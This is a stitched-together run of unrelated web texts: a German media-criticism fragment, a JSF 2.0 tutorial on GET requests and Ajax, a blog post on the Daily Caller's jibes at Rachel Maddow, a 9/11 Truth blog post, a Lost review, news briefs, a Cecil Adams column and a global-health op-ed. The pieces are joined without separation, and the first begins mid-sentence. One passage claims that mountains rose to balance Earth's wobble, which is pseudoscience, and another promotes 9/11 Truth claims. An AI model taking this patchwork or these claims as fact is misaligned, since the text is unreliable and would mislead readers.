Und der Skandal besteht darin , dass der Clip , wie er sich beim Vorsingen blamiert , danach noch einen Tag lang auf den Internetseiten von “ TV Total ” zu sehen war ?
( Iinzwischen ist er dort verschwunden , aber stattdessen auf Bild.de zu sehen , was man ironisch finden kann oder konsequent . )
Aber so lächerlich und durchschaubar das Aufblasen dieser Geschichte ist — es ist nicht lächerlich genug , dass anderen Medien sie nicht besinnungslos abschreiben würden .
Seiten wie Quotenmeter .de und die Internet - Ableger von “ Focus ” , “ Abendzeitung ” , “ Hamburger Morgenpost ” , “ Augsburger Allgemeine ” u.v.a. erzählen die Nicht - Geschichte nach .
Der Online - Auftritt von “ Gala ” formuliert : “ Kurz vor dem Halbfinale ( 8. März , 20.15 Uhr , Pro7 ) von ‘ Unser Star für Oslo ’ ist einer der Kandidaten der Stefan - Raab - Show gestorben ” — als hätte es sich um einen der Kandidaten aus dem Halbfinale ( am 9 . März ) gehandelt , was tatsächlich eine Nachricht gewesen wäre .
Selbst dpa hat inzwischen eine Meldung zum Thema veröffentlicht .
So gesehen muss man mit Pittelkau wohl doch kein Mitleid haben .
Und immerhin scheint seine Geschichte nicht erfunden zu sein .
Das ist doch schon was .
Inside JSF 2.0's Ajax and HTTP GET Support
Unlike previous releases of JavaServer Faces ( JSF ) , JSF 2.0 supports HTTP GET requests and full Ajax integration .
JSF 1.x releases sent all server requests using HTTP POST ( hence , no support for GET requests ) and offered virtually no support for Ajax integration .
With support for these techniques , this newest version of the Java component UI framework enables developers to build truly dynamic web pages simply and easily .
At the highest level , JSF technology provides an API for creating , managing , and handling UI components and a tag library for using components within a web page .
The JSF 2.0 release simplifies the web developer 's life by providing the following :
Reusable UI components for easy authoring of web pages
Well defined and simple transfer of application data to and from the UI
Easy state management across server requests
Simplified event handling model
Easy creation of custom UI components
In this article , we drill down into JSF 2.0's support for GET requests and Ajax integration , as well as the productive features that this support makes possible .
For demonstration , we refer to aspects of a simple application throughout the article .
The demo application is an online quiz that allows a registered user to answer five simple questions that test his or her general knowledge .
Towards the end of the quiz , the application displays the score .
Using GET Requests in JSF 2.0
To support GET requests , JSF 2.0 introduced the concept of View Parameters .
View Parameters provide a way to attach query parameters to URLs .
You use the tag < f:viewParam > to specify the query parameters .
Take this code for example :
< f:metadata > < f:viewParam name= " previousScore " value= " #{recordBean.oldScore} " /> </f:metadata >
In this example , the value of the parameter previousScore will be automatically picked up and pushed into the property oldScore of the recordBean .
So , when a request like this comes for a URL :
displayData.jspx?previousScore=10
The value of the bean property oldScore will be set to 10 when the request is processed , which avoids manually setting the value or using a listener .
Another interesting point to notice is that like any other component the < f:viewParam > tag supports conversion and validation .
Hence , there is no need for separate conversion / validation logic .
Table 1 lists the new tags in JSF 2.0 related to support for the GET request .
Figure 1 . New Tags Related to GET Requests
Tag Description h:button Renders a button that generates a GET request without any handcoding of URLs h:link Renders a link that generates a GET request without any handcoding of URLs h:outputStylesheet Refers to a CSS resource h:outputScript Refers to a JavaScript resource f:event Registers a specification - defined or a user - defined event f:ajax Enables associated component (s ) to make Ajax calls f:metadata Declares the metadata facet for this view f:viewParam Used in < f:metadata > to define a view parameter that associates a request parameter to a model property f:validateBean Delegates the validation of the local value to the Bean Validation API f:validateRegex
Uses the pattern attribute to validate the wrapping component f:validateRequired Ensures the presence of a value
Bookmarking Support
Because all JSF 1.x interactions with the server use only HTTP POST requests , those JSF versions do n't support bookmarking pages in a web application .
Even though some tags supported the construction of URLs , it was a manual process with no support for dynamic URL generation .
JSF 2.0's support for HTTP GET requests provides the bookmarking capability with the help of new renderer kits .
A new UI component UIOutcomeTarget provides properties that you can use to produce a hyperlink at render time .
The component allows bookmarking pages for a button or a link .
The two HTML tags that support bookmarking are h:link and h:button .
Both generate URLs based on the outcome property of the component , so that the author of the page no longer has to hard code the destination URL .
These components use the JSF navigation model to decide the appropriate destination .
Take the following code for example :
< h:link outcome = " login " value= " LoginPage " > < f : param name = " Login " value= " #{loginBean.uname } " /> </h:link >
This bookmarking feature provides an option for pre-emptive navigation ( i.e. , the navigation is decided at the render response time before the user has activated the component ) .
This pre-emptive navigation is used to convert the logical outcome of the tag into a physical destination .
At render time , the navigation system is consulted to map the outcome to a target view ID , which is then transparently converted into the destination URL .
This frees the page author from having to worry about manual URL construction .

Tucker Carlson 's Daily Caller website has made a habit lately of calling Rachel Maddow " a man . "
The site also maintains that this is not at all offensive .
We 're not buying it .

The first edition of this hilarious joke occurred in Matt Labash 's inaugural advice - ish column on the site .
Labash wrote ,
I have the gift of wisdom .
Does that sound arrogant ?
I 'm sorry , that was n't my intention .
I did n't choose wisdom .
It chose me .
If I had my druthers , I 'd have chosen another gift , perhaps the untold riches of Lil ' Wayne , whose teeth are made of actual diamonds , or to be the sexiest man alive , like Rachel Maddow .
But wisdom is what they gave me , so wisdom is all I have to give back to you .

The gallery was supposedly in response to Keith Olbermann 's insinuation that Fox News hires female commentators for their appearance , and its dig at " members of the MSNBC Brain Trust " suggests that the women of MSNBC are mere eye candy ( because the proper response to insults about women 's ability is to insult other women 's ability — everybody wins ! ) .
Except : at the bottom there 's Rachel Maddow , with the caption " Whoops , how did that one get in there ?
Sorry , man .
I mean dude .
I mean Rachel !
Sorry , Rachel . "
While it 's not not surprising that a site run by Carlson would take cheap shots at Maddow , it 's kind of interesting that they try to claim they 're not cheap shots .
The knee - slapping " Sorry , man " line links back to a second column by Labash , in which he responds to the question " You called Rachel Maddow a man ?
How dare you , sir ?
How dare you ? " , posed by one Jim Treacher ( a blogger for the Daily Caller , who in a bizarre turn of events was apparently run down yesterday by what may have been a Secret Service van ) .
Labash responds , in part ,
[ W ] ho do I think I am , implying that Rachel Maddow has a somewhat mannish appearance ?
What kind of frat - boy mouth - breather would say that in public ?
Where would I get such an idea ?
I honestly do n't know .
I can't imagine anybody else saying such a thing .
Wait a second .
Actually , I can : " I am what I am , I look like a dude . " – Rachel Maddow , as quoted by The New Yorker , October 17 , 2009 " I 'm a big lesbian who looks like a man .
I am not , like , Anchor Babe , and I 'm never gonna be . " – Rachel Maddow as quoted in GQ magazine , November 2008

Now , my first thought at reading the " man " comments was that they were n't particularly effective as insults , precisely because Rachel Maddow consciously chooses to dress and style herself in a masculine way .
Given that she 's openly made statements to that effect , she 's probably not all that offended when someone suggests that she looks butch .
But that does n't mean the suggestions were n't intended as insults .
In fact , Labash 's explanation reads as a little disingenuous .
Making fun of women for looking or acting mannish is a time - honored way of belittling them , of trying to keep women out of both men's clothes and men's roles , and just because the woman in question is an out lesbian does n't mean jokes about her are n't part of this misogynist tradition .
Still , I might have given Labash a pass had he not said this :
The beautiful and talented Rachel Maddow has lots of fans .
And those fans were hurt by what I said .
And when they hurt , I hurt .
Though I think some of them willfully misinterpreted that I was somehow disparaging Ms. Maddow because she is a lesbian .
Which could n't be more false , since I am perpetually and eternally enthusiastic about lesbians .
I embrace Maddow 's lesbianism .
In fact , any woman who wants to explore lesbianism has both my applause and encouragement .

Presumably Labash also loves walking behind the women 's movement .

Prayers For Jim Treacher [ Hot Air ]
The website AntiWar.com - which has historically shown mixed interest in 9.11 Truth issues , is running this interview with Coleen Rowley .
It was a pleasure for me to meet Coleen at the Treason in America conference last week .
It was somewhat sureal that , years after including her story in my film , she was rushing up to me in person , after my presentation , to shake my hand and thank me .
Coleen is an extremely important part of our efforts to reach out and connect with a new audience .
Like Cindy Sheehan she is building bridges for 9/11 Truth with the antiwar community - and we should all support and promote her efforts as vigorously as possible .
http://antiwar.com/radio/2010/03/13/coleen-rowley/
Coleen Rowley , retired FBI agent and 9/11 whistleblower , discusses the myth that FISA restrictions ( and not incompetence at FBI and CIA headquarters ) prevented critical intelligence sharing prior to 9/11 , CIA Director George Tenet ’s August 2001 “ Islamic Extremist Learns to Fly ” powerpoint briefing about Zacarias Moussaoui and why the creation of the DHS and increased centralization of intelligence organizations did nothing to fix 9/11 failures .
Coleen Rowley grew up in a small town in northeast Iowa .
She obtained a B.A. degree in French from Wartburg College in Waverly , Iowa and then attended the College of Law at the University of Iowa .
She graduated with honors in 1980 and passed the Iowa Bar Exam that summer .
In January of 1981 , Ms. Rowley was appointed as a Special Agent with the FBI and initially served in the Omaha , Nebraska and Jackson , Mississippi Divisions .
In 1984 , she was assigned to the New York Office and for over six years worked on Italian - organized crime and Sicilian heroin drug investigations .
During this time , Ms. Rowley also served three separate temporary duty assignments in the Paris , France Embassy and Montreal Consulate .
In 1990 , Ms. Rowley was transferred to Minneapolis where she assumed the duties of Chief Division Counsel , which entailed oversight of the Freedom of Information , Forfeiture , Victim - Witness and Community Outreach Programs as well as providing regular legal and ethics training to FBI Agents of the Division and additional outside police training .
In May of 2002 , Ms. Rowley brought several of the pre 9/11 lapses to light and testified to the Senate Judiciary Committee on some of the endemic problems facing the FBI and the intelligence community .
Ms. Rowley ’s memo to FBI Director Robert Mueller in connection with the Joint Intelligence Committee ’s Inquiry led to a two - year - long Department of Justice Inspector General investigation .
She was one of three whistleblowers chosen as Person of the Year by TIME magazine .
In April 2003 , following an unsuccessful and highly criticized attempt to warn the Director and other administration officials about the dangers of launching the invasion of Iraq , Ms. Rowley stepped down from her ( GS - 14 ) legal position to resume her position as a ( GS - 13 ) FBI Special Agent .
She retired from the FBI at the end of 2004 and now speaks publicly to various groups , ranging from school children to business / professional / civic groups , on two different topics : ethical decision - making and “ balancing civil liberties with the need for effective investigation . ”
Ms. Rowley authored a chapter in a book published in 2004 by the Milton Eisenhower Foundation entitled , Patriotism , Democracy and Common Sense : Restoring America ’s Promise at Home and Abroad .
She is also now an avid blogger on the Huffington Post .
Gen Sheehan is a former Nato Supreme Allied Commander
A retired US general has apologised for suggesting that Dutch troops failed to stop the Srebrenica massacre in Bosnia in 1995 because some of them were gay .
Gen John
Sheehan acknowledged that his views had been wrong , after the Dutch general he cited as his source denied having said anything of the kind .
He made the claim at a Senate hearing on whether openly gay people should be allowed to serve in the US military .
The comments caused a storm of controversy in the Netherlands .
Srebrenica was a UN safe haven under the protection of Dutch peacekeepers when , in 1995 , Bosnian Serb forces overran the town , killing some 8,000 Muslim men and boys .
To be clear , the failure on the ground in Srebrenica was in no way the fault of the individual soldiers
Retired Gen John Sheehan Earlier this month , Gen Sheehan - a former Nato commander - cited retired Gen Henk van den Breemen as one of the Dutch army chiefs who had allegedly said that gays were " part of the problem " in the fall of Srebrenica .
He told a US congressional hearing that European armies had been weakened by efforts to " socialise " them , including allowing gay soldiers to serve .
But in an e-mail to Gen Breemen released by the Dutch defence ministry , Gen Sheehan said : " I am sorry that my recent public recollection of those discussions of 15 years ago inaccurately reflected your thinking on some specific social issues in the military . "
He added : " To be clear , the failure on the ground in Srebrenica was in no way the fault of the individual soldiers . "
A spokesman for the Dutch defence minister welcomed the apology , saying he was " satisfied " and " very pleased that the case is closed " .

nucollage : " This book is a gorgeous testament to fresh design thinking , spontaneous creation and mind - melting collages and stories of the work "
- Paul Macfarlane , 2019
AIGA eye on design :
august 2019
" David Carson is a man who has transformed the field of graphic design throughout his career .
making him as relevant today as ever .
he ’s rather lovely when we chat — and pretty humble to boot .
He ’s also still really into surfing . "
Jeffery Saddoris :
august 2019
" New Collages From Iconic Graphic Designer David Carson
This is Carson at his freeform best . "
Self - taught , resolutely grid - free , and unafraid to speak his mind ( he ’s also very funny ) , Carson ’s work made designers realize that editorial layouts did n’t have to stick to the rules around image placement , consistent typography , or doggedly flowing copy issue after issue .
His attitude — one he sees as partly underdog , partly “ why not ? ” — carries through not only his most famous projects like art directing Ray Gun magazine or his work for Transworld Skateboarding , but also branding projects , surfboard designs , packaging design for potato chips , and more ; It ’s rare to speak to a young designer who ’s into zines , music , and a generally less strict aesthetic , and have them not cite Carson as an influence .
The American Center for Graphic Design has exalted him as having made “ the most important work coming out of America , ” while Creative Review has called him “ the art director of the era . ”
In 2014 , he was awarded the AIGA Gold Medal .
But for all the praise he ’s received , David Carson has been on the leading edge of graphic design for decades and has created iconic work for some of the biggest companies and most important brands in the world .
In his latest book , nu collage .001 , Carson has created a new collection of collages without the constraints of clients or creative briefs and the resulting work is a brilliant evolution that straddles the line between art and design .
Lost 's Benjamin Linus has hit rock bottom , both morally and psychologically .
So now is he going to have a miraculous transformation into the Island 's noblest character ?
Please , no .
Just no .
Spoilers for last night 's Lost ahead .
Ben might well be our favorite Lost character these days — and last night 's episode helped remind us why .
( It also improved Ben 's standing in the awesomeness sweepstakes by making our other two favorite current characters , Miles and Hurley , seem dickish and weak , respectively .
But more on that later . )
Michael Emerson proved , yet again , that he 's probably the best actor on this show , taking some really tough material and just going all - out with it .
Advertisement
I think a big reason why the " flash sideways " in the recent episodes have n't always worked for me as well as they might is the fact that the characters still feel the same .
We do n't really get to see a different side of these people , or a different version where things worked out really differently .
They 've tried , a bit , but Island Jack and L.A.
Jack just feel like the same guy to me , even with the kid in the mix .
But you would not mistake the two versions of Ben in last night 's episode for the same person , apart from a few of the same character beats .
Advertisement
L.A . Ben is meek and good - natured , but with a healthy dose of self - loathing over being a " loser . "
( And he 's the second character we 've seen whose major daddy issues do n't exist in this alternate timeline . )
He 's no longer Alex 's adoptive father , but thanks to some piece of synchronicity , he 's still in her life , in a much healthier way .
Even when L.A. Ben discovers in himself a piece of Island Ben 's famous manipulative streak , it 's much more tentative ( and less masterful ) than the " original " Ben 's handiwork .
Unless , of course , Ben actually wanted the principal to keep his job but be his bitch ?
And he maneuvered Reynolds into thinking he'd won ?
( Nice job casting Dickless as the principal , by the way ! )
Meanwhile , Island Ben is not the man he used to be either — he seriously seems to have lost his mojo , unless that 's just an act .
He 's terrified , wracked with remorse , confused , and unable to spin a convincing lie to save his life .
Even when he 's telling the truth , he looks like he 's lying .
And that 's before he opens his heart to Illana in the heart - rending clip above .
His face goes through so many expressions in that one scene , every one of which tells its own story .
It 's an amazing performance .
And yes , it 's nice to be reminded of the impact that Alex 's death had on Ben — after all , that 's how Smokey got a hold on Ben in the first place — by confronting Ben with Alex 's " ghost " and having her tell him to obey Flocke 's every whim .
It really feels like we 're seeing into the heart of Ben .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
And of course , while Ben pours out his regrets for the death of Alex , the other Ben is refusing to push Alex under a bus this time around , for the sake of power .
Have the two Bens learned something ?
Advertisement
And yet , I still hope this is a giant fake - out .
Something about the idea of Ben redeeming himself just does n't sit right with me — maybe partly because this show really needs a good villain .
Not that Smokey does n't have his moments of lovely nastiness , but he 's just not quite a Ben - level villain yet .
( And actually , this is a problem — it feels like the show is trying really hard to show us how bad - ass Smokey is , by having everybody act terrified of him , including Richard Alpert , and showing how he yanked Ben 's chain .
But the more the show yells at me " SMOKEY IS REALLY SCARY ! REALLY ! " , the less convinced I am .
Hmm . )
Ben is one of the all - time great characters on television , and one of the main reasons why Lost will be talked about for decades to come .
It 's been toothache - level painful to see him so confused and low this season — which I 'm sure is the point .
But Ben deserves something better than the bog- standard " evil manipulator hits rock bottom , then discovers his inner goodness " arc .
Ben deserves something really rich and complicated .
Advertisement
Suffering , leading to redemption , is for lesser characters .
Plus redemption , in Ben 's case , would probably mean accepting his status as a pawn , and deciding to be Jacob 's pawn instead of Smokey's .
The Ben arc I really want to see involves Ben getting his self - respect back , no matter what the cost .
I want to see Ben get the better of both Smokey and the smug ghost of Jacob , who have both been using him for far too long .
Jacob really deserved what he got , especially from Ben 's perspective , and Smokey deserves worse .
So let 's hope this whole " remorse " thing is at least partly an act , and Ben has some master plan .
Advertisement
Also notable in last night 's " A " storyline was the first occasion on which someone in the L.A. - verse has mentioned the island — Roger Linus , who apparently did join the Dharma Initiative in this universe .
It 's a tad confusing — so Roger and his son Ben did go to the island , and Ethan was presumably still born there .
But now they 're all in L.A. ?
How ?
I do n't see how the hydrogen bomb going off in 1977 can explain this .
Maybe it's because in the L.A.- verse , the Losties never time - traveled back to 1977 , and thus Sayid never shot Ben ?
( And yes , I know that this universe was created because the Losties traveled back to 1977 and set off that bomb .
But it seems as though the divergences from that event must have gone backwards as well as forwards , or Roger and Ben would have sunk with the island . )
Advertisement
So meanwhile , in the " B " plot , it seems like Jack really only has one card up his sleeve nowadays — attempted suicide .
Somebody gives Jack a pill for Sayid ?
He attempts suicide .
Somebody wants to blow himself up ?
He attempts suicide .
What does Jack do if someone cuts him off in traffic ?
It was neat , though , how Hurley namechecked Arzt in an episode where Arzt made a major comeback .
Advertisement
Oh , and it turns out Jacob was absolutely right about Jack — he just needed to go sit on a hill and brood for a few minutes , and he came around to Jacob 's point of view utterly .
Jack now totally swallows the " I was brought here for a reason " line once again and is 100 percent ready to be Jacob 's monkey - puppet , because Jacob let him see the lighthouse with the mirror showing his childhood house .
( Did n't Jack swear that he was done with the " I 'm here for a reason " thing , after the last time , when he basically killed Juliet ? )
So now that Jacob is dead and Smokey is strutting around in his new , fine - looking body , Richard Alpert is filled with despair and wants to end it all .
But because he was touched by Jacob , Richard Alpert can't kill himself — he needs Jack to do it for him , in the most baroque , cartoony way possible .
Advertisement
I guess we 're supposed to think that Jack and the other people touched by Jacob are immortal now — although , obviously , Sayid was able to die , for a while anyway .
A thousand years of Jack doing his Guilt Guy schtick sounds pretty scary .
Is it just that anyone touched by Jacob does n't age and can't commit suicide ?
I 'm assuming the bomb would have gone off if Jack had left the Black Rock the way Richard wanted him to .
So can anyone kill Richard Alpert , or just a candidate , like Jack ?
And then the episode ends with the endless slow - mo reunion between Jack , Hurley and Alpert and the gang on the beach , with Ben standing off to one side like the outcast he is .
And then the giant reveal that the guy who 's coming to the island is our other favorite old villain — the ultra nasty Charles Widmore , in a submarine !
Fuck yeah .
Advertisement
I guess we 'll get more answers in two weeks , when the giant " Richard Alpert 's Excellent Adventure " episode airs .
But when do we get the " Ben 's Big Score " episode ?
Come on , Lost !
Ausra
Areva , the giant French nuclear company , has bought Ausra , a small manufacturer of solar thermal systems that can be used for electricity production or industrial steam .
“ We are expanding our carbon - free portfolio , ’’ said Anil Srivastava , a senior executive vice president at Areva .
The company also builds wind turbines and biomass plants .
“ Because of our nuclear knowledge , we know how to design and build plants , ’’ he said .
Ausra , based in Mountain View , Calif. , makes curved mirrors that focus the sun ’s heat on a black pipe running down the middle .
Inside the pipe , a working fluid is heated and then used to make steam , which drives a conventional steam turbine to make electricity .
Depending on design details , the steam can be stored so that production can be scheduled at the time when the electricity would be most valuable , improving the economic viability of the project .
Ausra had hung out the “ for sale ” sign some months ago .
The company has a five megawatt demonstration plant near Bakersfield , Calif. , and a factory in Las Vegas that makes the mirrors .
In New South Wales , Australia , it has a solar array that feeds steam into an existing coal - fired power plant , reducing the need to burn coal during the day .
Capital costs in that plant are small , and the investment is repaid by savings in coal , according to Ausra .
It has also sold steam systems to industrial companies .
Ausra ’s chairman and chief executive , Robert E. Fishman , said the company ’s product was selling in California because of the state ’s requirement that utilities get a large fraction of their power from renewable sources .
But the goal , he said , was to reach “ grid parity , ” and Areva , with its manufacturing expertise , would help Ausra do that .
Ausra ’s cost of production , in cents per kilowatt - hour , is “ in the low - to mid-teens . ’’
Nationally , the average cost of a kilowatt - hour is about 11 cents , but it is higher in some locations in peak periods .
In addition , Areva will offer buyers long - term assurance of technical support , the two men said .
The solar thermal industry , said Mr. Srivastava , is good at “ making large sensational announcements ” about new projects , but then “ doing very little to build those power plants . ’’
Areva wants to be the world ’s largest solar thermal producer , he said , and has the engineering and commercial skills to push the projects along .
Ausra is privately held and the sale price was not disclosed .
Whenever you save money instead of splurging at the mall , or opt for the gym over a relaxing evening on the couch , you might want to thank a region of your brain just above the left ear .
This brain area could be responsible for the human ability to resist temptation and wait around to reap rewards , a new study finds .
The results show that when this brain region , called the left lateral prefrontal cortex , is impaired , people are more likely to choose immediate yet smaller rewards over larger rewards that wo n't come until later .
The findings might one day help researchers to better understand psychiatric disorders like substance abuse and gambling , since alcoholics and gamblers are thought to have problems withstanding the pull of their drug of choice .
And the results could explain why children , adolescents , and even young adults are so impulsive and often give in to temptation , the researchers say .
" The lateral prefrontal cortex really is one of the last brain structures to mature ; it matures rather late during puberty and even during adolescence and into young adulthood , " said study researcher Bernd Figner of Columbia University in New York .
" So this can help explain why adolescents and young adults often seem to have a hard time delaying gratification . "
Brain buzzes
To understand more about how we decide whether to resist temptations , Figner and his colleagues enrolled 52 college - aged men to participant in a brain stimulation experiment .
The subjects had short magnet pulses applied to specific regions of their brain , a technique called " transcranial magnetic stimulation , " or TMS .
The stimulations come from a coil placed on the subjects ' head , so the technique is not invasive , and the effect is only temporary .
The subjects received stimulations to either their left or right prefrontal cortex , or they received a " sham stimulation " that was n’t real .
To resist or not
After brain stimulations , the participants completed several tasks involving choices , answering questions like " Would you prefer $ 20 dollars today or $ 30 in two weeks ? "
Those who received stimulations to their left lateral prefrontal cortex more often chose the sooner , smaller rewards compared with those who received stimulations to the right prefrontal cortex or the control group .
However , if both choices were in the future ( $ 20 in two week vs. $ 30 in four weeks ) , there was no real difference between the groups .
This suggests the effect was very specific , and only comes into play when subjects have to exert self - control to resist the tempting , immediate rewards , Figner said .
Once scientists understand the brain mechanisms underlying this type of self - control , they could design interventions to help people make more optimal decisions in the long - term , Figner said .
However , more studies are needed in people of all ages , he added .
The results were published March 28 in the journal Nature Neuroscience .
Dear Cecil : I 've bought many cigarettes in my years , but all of them have been class A cigarettes .
I 've seen third - class mail , grade B beef , and C - average math , but why no class B cigarettes ?
JShaft666 , via AOL
Cecil replies :
We ’re not big on smoking around here , Shaft , but we figure whatsoever concerns humanity should concern us .
So we called up Cliff at the federal Bureau of Alcohol , Tobacco and Firearms ( and do n’t those sound like the ingredients for a great camping trip ? ) .
Cliff revealed the following facts :
(1) Federal revenooers recognize two kinds of cigarettes : small cigarettes ( class A ) , which weigh up to three pounds per thousand and are taxed at $ 12 per thou ; and large cigarettes ( class B ) , which weigh more than three pounds per thousand and have a tax rate of $ 25.20 .
(2) Total class A cigarettes produced in fiscal 1996 : 755 billion .
(3) Total class B cigarettes produced in fiscal 1996 : zero .
We thought : boy , this sounds like an extremely useful classification system .
What other nonexistent cigarettes can we dream up categories for ?
Concrete cigarettes !
Electrical cigarettes !
Cigarettes with stainless steel linings !
This just shows what a bad attitude we have .
Cliff patiently explained that in fiscal 1995 , 83,000 class B cigarettes were produced , and 105 million were taxed .
We thought about this , then we asked the obvious question : “ Huh ? ”
“ They must have been cleaning out the inventory , ” Cliff replied .
Cigarettes are n’t taxed until they ’re put into sales channels .
The market for class B cigarettes was declining rapidly .
This does n’t sound like a market that ’s declining , we thought .
This sounds like a market that ’s dropped dead .
We asked Cliff : have you ever seen a class B cigarette ?
Sure , Cliff said .
We then heard the sound of someone rummaging around in what we took to be the ATF ’s Big Drawer of Cool Stuff .
“ There ’s a hookah in here ! ” Cliff exclaimed at one point .
At last he found what he wanted : a brand called Cigarettellos .
He was cagey about the manufacturer ’s identity , no doubt having a certain paranoia about spilling the beans on the tobacco industry to weasels from the press .
But we found out .
Cigarettellos were manufactured by Nat Sherman International , a purveyor of fine tobacco products in New York City and for many years one of the only makers of class Bs .
On the horn with Joel Sherman , president of Nat Sherman International , we ascertained the following truths :
(1) Cigarettellos were ordinary cigarettes except that they were 6.5 inches long .
This gives you a clue as to the long - term marketing problem faced by this brand .
You ’re conspicuous enough smoking one of those 100 - millimeter jobs ; who wants to be seen waving a cigarette the size of a magic wand ?
(2) Nat Sherman also made several other brands of large cigarettes , including Fantasia ( which were rolled in multicolored paper ) and MCD Double .
As near as Joel could recall , they ’d been introduced as novelty items in the 1960s .
But they sold in minuscule quantities — mostly through specialty tobacco shops — and they were a pain to make .
After losing money on them for 30 years , Joel figured the market was telling him something , and what it was telling him was , “ Do n’t make these cigarettes . ”
So around 1995 he threw in the towel .
(3) The brands are still made in four - inch class A versions , however , just in case you want to re-create the class B experience with scissors and Elmer ’s glue .
But Joel , we said , you pulled the plug on a product that was moving 105 million in its last year .
This number is minuscule ?
Was n’t all us , said Joel .
He recalled something about one of the majors test - marketing a class B cigarette with greater circumference rather than length .
We are not seeing the sexiness of this , and apparently neither was anyone else .
The product was withdrawn .
So now you ’re thinking : damn , no more class B cigarettes !
There ’s a hole in my life that shall never be filled .
You might be able to bum one of Cliff ’s ‘ tellos .
But if not , never fear : you can still get class B clove cigarettes .
We know this because our assistant Jane found some in a smoke shop .
They ’re not big , they ’re more lethal than all - tobacco smokes , and why they do n’t show up in the ATF statistics , even Cliff ca n’t explain .
But class B is class B .

Highest Peaks 8000nders : Nature has created these difficult to live and to surpass awfully high super structures with definite purpose .
Let us ponder .
Billions of years ago the lonely SUN started spitting molten mass around , that cooled to form the planets in our Solar System .
One such fireball ultimately became our Earth .
The surface cooling was probably irregular and in stages , creating layers and causing cracks in the outer skin .
This divided the crust into huge plate like masses .
These floating masses collided with further cooling and often overlapped , forming big heaps and pitches .
The earth ’s rotation around its axis could not stay uniform because of these moving crusts and started to wobble .
The wobbling shook the surface harder particularly along the equatorial circumference , pressing these plates and pushing the remaining softer sections to RISE , BEND and TWIST as necessitated by the in motion forces .
Thus , forming the deeps ( Oceans ) plateaus and mountains .
The mountains rose higher at places where the Earth needed extra weight and shrank deeper to shed weight in order to balance its wobble for a very very smooth jerk - free rotation , which we feel today .
It took billions of years to become today ’s cool and livable Earth .
The atmosphere developed at later stages .
World leaders will come together at the United Nations in September in order to accelerate progress towards the Millennium Development Goals ( MDGs ) .
Three of the eight MDGs involve bringing primary health services to the entire world 's population .
A small amount of global funding , if well directed , could save millions of lives each year .
The key step is to expand the Global Fund to Fight Aids , Tuberculosis , and Malaria into a Global Health Fund .
The Global Fund was created in 2002 to help the world battle three killer diseases , and its accomplishments have been spectacular , making it arguably the most successful innovation in foreign assistance of the past decade .
As a result of Global Fund programmes , an estimated 2.5 million people are on antiretroviral Aids therapy .
No fewer than 8 million people have been cured of TB .
And more than 100 million long - lasting insecticide - treated bed nets have been distributed in the fight against malaria .
In total , studies suggest that Global Fund programmes have saved 5 million lives .
The Global Fund 's remarkable successes result from its operational procedures .
Disease - specific committees , called the Country Co-ordination Mechanism ( CCM ) , are constituted in each developing country .
Each CCM is chaired by the national government , but incorporates input from non-government organisations to formulate national - scale , disease - specific plans for submission to the Global Fund .
Once the Global Fund receives these plans , they are sent to a Technical Review Panel ( TRP ) to check that the plans are scientifically sound and feasible .
If the TRP approves , the plan is sent to the board of the Global Fund , which then votes to approve financing .
Once the programme gets underway , the Global Fund follows its implementation , undertaking audits , monitoring , and evaluation .
Since 2002 , the Global Fund has approved around $ 19bn in total funding .
There are two huge challenges now facing the Global Fund , and especially the donor countries that support it .
The first is lack of financing .
The Global Fund has been so successful that countries are submitting increasingly ambitious programmes for consideration .
Unfortunately , the Global Fund is already in a state of fiscal crisis .
It needs around $ 6bn per year in the next three years to cover expansion of programmes for the three diseases , but it has only around $ 3bn per year from donor countries .
Unless this is corrected , millions of people will die unnecessarily .
The second challenge is to broaden the Global Fund 's mandate .
So far , the Global Fund has addressed MDG 6 , which is focused on the control of specific killer diseases .
Yet control of these three diseases inevitably involves improvement of basic health services – community health workers , local clinics , referral hospitals , emergency transport , drug logistics – that play a fundamental role in achieving MDG 4 ( reduction of child mortality ) and MDG 5 ( reduction of maternal mortality ) .
All three health MDGs are interconnected ; all are feasible with an appropriate scaling up of primary health services .
The obvious step to address MDGs 4 and 5 is to explicitly expand the Global Fund 's financing mandate .
Many programmes , such as those in the Millennium Villages project , already show that a scaling up of primary health systems at the village level can play a decisive role in reducing child and maternal mortality .
Expanding the Global Fund 's mandate to include financing for training and deployment of community health workers , construction and operation of local health facilities , and other components of primary health systems could ensure the development of these local systems .
Many countries – including France , Japan , Norway , the United Kingdom , and the United States – have recently recognised the need to move beyond the financing of control of Aids , TB , and malaria to financing improvements in primary health systems more generally .
But they seem to view the issue of health - system financing as an either / or choice : scale up control of Aids , TB , and malaria , or scale up financing of primary health systems .
The truth , of course , is that both are needed , and both are affordable .
The annual cost of specific disease control in the next three years is perhaps $ 6bn , and another $ 6bn per year for health - system expansion .
The total , $ 12bn per year for an expanded Global Fund , might seem unrealistically large compared to the $ 3bn spent now .
But total annual funding of $ 12 billion is really very modest , representing around 0.033 % ( three cents per $ 100 ) of the donor countries ' GNP .
This is a tiny sum , which could be easily mobilised if donor countries were serious .
Barack Obama has been outspoken in support of scaling up primary health services , yet the specific budget proposals from his administration are not yet satisfactory .
The worst of it is that the Obama administration 's budget for the 2011 provides just $ 1bn per year to the Global Fund .
This small sum is unworthy of US leadership .
If the US would expand its annual support to the Global Fund to around $ 4bn per year , it would likely induce the rest of the world 's donors to put in $ 8bn per year , keeping the US share at around one - third of total funding .
To raise these extra amounts , the Obama administration could levy an excess - profit tax on Wall Street to make up the budget gap .
Wall Street bankers , whose poor performance did so much damage to the world economy in recent years , and who still are reaping excessive bonuses , would also begin to make amends by seeing their new tax payments contribute to saving the lives of millions in the coming years .

The 1992 tearjerker Lorenzo ’s Oil told the true story of one family ’s struggle to save their son from X - linked adrenoleukodystrophy ( ALD ) , a deadly degenerative brain disease .
Unfortunately , over the ensuing years , the oil of the film ’s title , a dietary supplement , has not panned out as the cure many people hoped it would be .
Now a paper in the November 2009 issue of Science suggests that the long - sought cure may come from gene therapy — a famously hyped approach to treatment that tragically caused the death of a teenage experimental subject in 1999 .
Since then , however , researchers have continued to cautiously pursue gene therapy for certain disorders with known genetic origins .
ALD , for instance , is caused by mutations in a gene called ABCD1 , leading to unusually high levels of a type of fatty acid that damages the material insulating some neurons .
It affects about one in 20,000 six - to eight - year - old boys , leading to death before adolescence .
The main treatment is still bone marrow transplantation : a risky procedure that relies on finding a suitable donor , explains Patrick Aubourg , a neurologist at France ’s INSERM research institute .
Now Aubourg and his team have showed in a preliminary trial that gene therapy stopped ALD in two boys for whom they could not find matching bone marrow donors .
